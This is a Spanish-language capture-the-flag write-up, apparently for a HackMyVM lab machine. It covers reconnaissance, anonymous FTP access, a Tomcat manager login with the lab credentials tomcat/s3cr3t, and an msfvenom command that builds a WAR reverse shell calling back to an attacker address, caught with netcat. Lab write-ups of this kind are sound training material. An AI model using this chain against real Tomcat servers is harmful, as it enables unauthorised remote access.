##MAQUINA -Pn

Iniciamos la maquina 

![img](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Screenshot%202024-05-02%20205809.png)

Hacemos un ping a la ip para ver si tenemos conectividad, el ttl al ser 64 puede ser que nos estemos enfrentando a una maquina Linux.

![img](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Screenshot%202024-05-02%20205900.png)

Una vez que tengamos la ip usamos nmap para ver los servicios y puertos que corren en la maquina:

![img](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Screenshot%202024-05-02%20210049.png)

Como un script de nmap nos muestra que en el puerto ftp podemos loguearnos como anonymous entramos dentro sin proporcionar contraseña.

Una vez dentro nos descargamos el archivo tomcat.txt.


![img](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Screenshot%202024-05-02%20210217.png)

El archivo tomcat.txt nos proporciona un usuario llamado "tomcat".

![img](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Screenshot%202024-05-02%20211624.png)

Ahora entramos al servidor web que corren en el puerto 8080.

![img](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Screenshot%202024-05-02%20213821.png)

Una vez ingresado vamos al apartado donde dice "manager webapp": 
Esto nos va a redirigir a un inicio de sesion el cual vamos a utilizar las siguiente credenciales:

````console
user: tomcat
password: s3cr3t
````

Ya estamos dentro del tomcat.

![img](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Screenshot%202024-05-02%20214138.png)

Hay una opcion donde vamos a poder subir un archivo .war.

![img](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Screenshot%202024-05-02%20214927.png)

Para ellos vamos a usar msfvenom para crear nuestro payload:

Este no funciona, pero hay que probar.

![img](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Screenshot%202024-05-02%20221329.png)

Utilizamos este que si funciono

```console
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.162 LPORT=443 -f war > reverse.war
```

lista de payload msfvenom:

https://www.nosolohacking.info/msfvenom-creando-diferentes-tipos-de-payloads/

Una vez subido nos va a aparecer en el inicio, asi que con en otra terminal nos ponemos en escucha con netcat y le damos 1 click y esperamos

![img](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Screenshot%202024-05-02%20221151.png)

![img](https://github.com/Qu0kk4/Quokka/blob/main/HackMyVm/image/Screenshot%202024-05-02%20221030.png)

LISTO SOMOS ROOT!
